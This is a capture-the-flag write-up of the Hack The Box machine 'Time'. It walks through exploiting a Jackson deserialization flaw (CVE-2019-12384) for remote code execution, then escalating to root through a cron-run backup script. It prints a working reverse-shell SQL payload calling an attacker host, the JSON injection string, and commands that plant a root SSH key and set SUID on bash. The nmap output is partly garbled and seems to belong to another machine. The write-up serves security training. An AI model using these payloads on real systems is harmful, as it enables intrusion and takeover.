---
description: >-
 Dec1pher's writeup on the medium-difficulty linux machine time from https://hackthebox.eu
---

# HTB - Time
* OS: Linux
* IP: 10.10.10.214

![](../../att/time.jpg)

## Overview
Time is a medium difficulty box that runs Linux and and a web app which is an online json beautifier and validator. The validator is in beta version according to the app and when we you input a json for validation it troughs an error that hints towards a known vulnerability for `com.fasterxml.jackson.core` which leads to RCE. The shell you get has user privileges on the box and using a local script that has access to the root directory we can escalate to root.

## Useful tools
1.   pyspy [https://github.com/DominicBreuker/pspy](https://github.com/DominicBreuker/pspy)

# Enumeration

## Nmap
```bash
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower. Warning: 10.10.10.206 giving up on port because retransmission cap hit (0).
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-15 18:09 EET
Nmap scan report for 10.10.10.206 Host is up (0.094s latency).
Not shown: 65179 closed ports, 353 filtered ports
PORT STATE SERVICE VERSION
22/tcp open ssh
| ssh-hostkey:	OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0) Apache httpd 2.4.18 ((Ubuntu))
|	2048 17:eb:9e:23:ea:23:b6:b1:bc:c6:4f:db:98: d3:d4:al (RSA)
|	256 71:64:51:50:c3:7f:18:47:03:98:3e: 5e:b8:10:19: fc (ECDSA)
|_	256 fd:56:2a:f8:d0:60:a7:f1:a0:a1:47:a4:38:d6: a8: a1 (ED25519)
80/tcp open http
|	http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Passage News
|	9876/tcp open landesk-rc LANDesk remote management Service Info: OS: Linux; CPE: cpe:/o:linux: linux kernel
|_	Service detection performed. Please report any incorrect results at https://nmap.org/submit/. 
Nmap done: 1 IP address (1 host up) scanned in 131.70 seconds Recon is Complete
```

Vising the website we can see a json validator which we will fuzz with json an random inputs to see if we get any special behavior.   

![](../../att/time-site.png)

Using random input on the validator we get the below error that got me searching on `jackson` vulnerabilities.
`Validation failed: Unhandled Java exception: com.fasterxml.jackson.databind.exc.MismatchedInputException: Unexpected token (START_OBJECT), expected START_ARRAY: need JSON Array to contain As.WRAPPER_ARRAY type information for class java.lang.Object`

# Getting RCE
Github had a POC for `CVE-2019-12384 Jackson RCE And SSRF`. Modifying the `inject.sql` payload to spawn a bash reverse shell we can get rce. The `inject.sql` can be found in the gihub repo with the POC and will look like that when modified.

```sql
CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
        String[] command = {"bash", "-c", cmd};
        java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
        return s.hasNext() ? s.next() : "";  }
$$;
CALL SHELLEXEC('bash -i >& /dev/tcp/10.10.14.162/4444 0>&1')
```

After modifying the `inject.sql` file we serve it with a simple http python server and the json that we will provide as input ,that can be found on the github repo as well, on the web app will look like that.

```ruby
["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://10.10.14.162:8000/shell.sql'"}]
```

> github POC repo on `CVE-2019-12384 Jackson RCE And SSRF` [https://github.com/jas502n/CVE-2019-12384](https://github.com/jas502n/CVE-2019-12384)

Upon validation of the above input we get a reverse shell on our netcat listener.

![](../../time-rce.png)

The shell that we got is as system user we can get the `user.txt` in the pericles home directory. 

# Privilege Escalation
## Local enumeration for privilege escalation to root
Uploading and running linpeas on the machine we see an interesting file being executed.

![](../../att/time-backup.png)

Going through the `backup.sh` we can see that it create a zip and moves it to root so we have right access to root folders. To further verify that claim I added a simple command to create a directory, I uploaded `pspy` and monitored what processes run. After some time I saw a cron job that runs the script and created my test directory as root. 

![](../../att/time-dir.png)

![](../../att/time-ps.png)

## First way to root access
So what we can do is add a command that adds our ssh key in the authorized_keys of the root 
```bash
echo "echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC14eMqG/FOTDWiOW/+SFlwKP0Ac2jWrfXnUhKwxzubtfQ7ioWePMyUHiVzjTDSdzaiKlv95TT9PpJu1mAzt6IHLXS7nJtJZjB27kMoq+Vf5NR8Jln3gvVC9NKO/YHO/xJVHZ/xmbfekGBG16YITYyc7kGo1P2vqcGbdK0sp5ttrMCJ65GCR38IxcZJN9WdBSSco4Hz7HcFyr98eYtZp36wD3Hw2yIjiNa8kPBDiHiHWNT14pfWYH5LLZJ5QEh2SQalBC3dValXOJEYrx/zo6HzGWnD60r0wRjBsv5KpOq+TvBufy/db56RYLkh6jDSm+BUI+4WeFQ/X39eJR7EosQYNgM83IvAYYXOtPZqVa9AsICAYBFTXAbk5eC4jaibNiMbuJkAVfnw9GvUB3yeFS8HJK4lJ0NWGE4lylPUjAuP+ENltQ0r6ewOf4oK65uPUZieVe7eeYmEWSlGj4Jv9Iiv46qJchl364IVAId6t01nsniF9lNewirp+pEU06Kua1E=" >> /root/.ssh/authorized_keys" >> /usr/bin/timer_backup.sh
```

And then ssh in with your private key

![](../../att/time-ssh.png)

![](../../att/time-id.png)

## First way to root access
Since the script is executed by root we can change the shell permissions. Setting the `/bin/bash` binary as SUID we can just elevate to root. The commands to do that are these.
```bash
echo “chmod +s /bin/bash” >> /usr/bin/timer_backup.sh
$ /bin/bash -p
```

